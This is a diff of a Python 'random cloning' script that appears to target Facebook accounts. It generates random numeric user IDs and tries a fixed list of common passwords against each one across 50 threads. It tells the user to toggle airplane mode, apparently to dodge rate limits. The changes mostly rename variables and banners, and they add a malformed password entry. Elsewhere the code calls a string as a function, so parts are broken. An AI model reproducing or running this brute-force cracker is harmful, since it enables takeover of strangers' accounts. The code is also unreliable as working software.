@@ -14,12 +14,12 @@ def o():
     print("\33[m\033[1;91m\033[1;41m\033[1;97m-------------------------------------------\033[;0m\033[1;91m\033[1;92m")
     jalan("\033[97;1m[\033[92;1m1\033[97;1m] \033[92;1mSTART RANDOM CLONING   ")
     print("\033[97;1m[\033[92;1m2\033[97;1m] \033[92;1mJOIN MY GROUP ")
-    Mahin = input('\033[97;1m[\033[92;1m?\033[97;1m] \033[92;1mSelect menu \033[38;5;196m: ')
-    if Mahin == '1':
+    Riyad = input('\033[97;1m[\033[92;1m?\033[97;1m] \033[92;1mSelect menu \033[38;5;196m: ')
+    if Riyad == '1':
         i()
-    if Mahin == '2':
+    if Riyad == '2':
         os.system('xdg-open https://www.facebook.com/gsriyad11')
-    if Mahin == 'E':
+    if Riyad == 'E':
         os.system('exit')
         return None
 import os,sys,time,json,random,re,string,platform,base64,uuid
@@ -59,8 +59,8 @@ class jalan:
 
 def back():
 	login()
-Mahin="Mahin"
-imt="SETU"
+Riyad="Riyad"
+imt="Riyad"
 ak="CLASS3-"
 myid=uuid.uuid4().hex[:8].upper()
 
@@ -115,9 +115,9 @@ logo=("""\033[1;97m
 try:
     print("\033[38;5;46m\nTOOL UPDATE SUCCESSFUL\n")
     time.sleep(2)
-    Mahin()
+    Riyad()
     print("\033[38;5;196m\nYOUR DEVICE IS NOT SUPPORTED!\n")
-    Mahin()
+    Riyad()
     v = 5.2
     update = ('5.2')
     update = ('5.2')
@@ -209,7 +209,7 @@ def i():
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(8))
         user.append(nmp)
-    with ThreadPool(max_workers=50) as setu:
+    with ThreadPool(max_workers=50) as Riyad:
         clear()
         tl = str(len(user))
         jalan('\033[97;1m[\033[92;1mᗙ\033[97;1m] \033[92;1mAGENTS    \033[38;5;196m: \033[1;32m'+str(len(ugen)))
@@ -219,9 +219,9 @@ def i():
         jalan("\033[97;1m[\033[92;1mᗙ\033[97;1m] \033[1;97mFIRST \033[1;34m[\033[1;32mON\033[1;97m/\033[38;5;196mOFF\033[1;34m] \033[1;97mAIRPLANE MODE")
         print('\033[38;5;46--------------------------------------------')
         for love in user:
-            pwx = [love,'bangladesh','i love you','696969','57273200','123321','121234','889900','708090','0987654']
+            pwx = [love,'bangladesh','i love you','696969','57273200','123321','121234','889900','708090','0987654',Bangladesh' ]
             uid = code+love
-            setu.submit(rcrack,uid,pwx,tl)
+            Riyad.submit(rcrack,uid,pwx,tl)
     print('\n    CRACK PROCESS HAS BEEN COMPLETED ')
  
 def rcrack(uid,pwx,tl):
@@ -279,7 +279,7 @@ def rcrack(uid,pwx,tl):
             else:
                 continue
         loop+=1
-        sys.stdout.write('\r\33[1;93m[\33[m-META\033[0m/%s\33[1;93m]\033[1;97mOK-\033[38;5;46m%s'%(loop,len(oks))),
+        sys.stdout.write('\r\33[1;93m[\33[m-GS XD-OK\033[0m/%s\33[1;93m]\033[1;97mOK-\033[38;5;46m%s'%(loop,len(oks))),
         sys.stdout.flush()
     except:
         pass
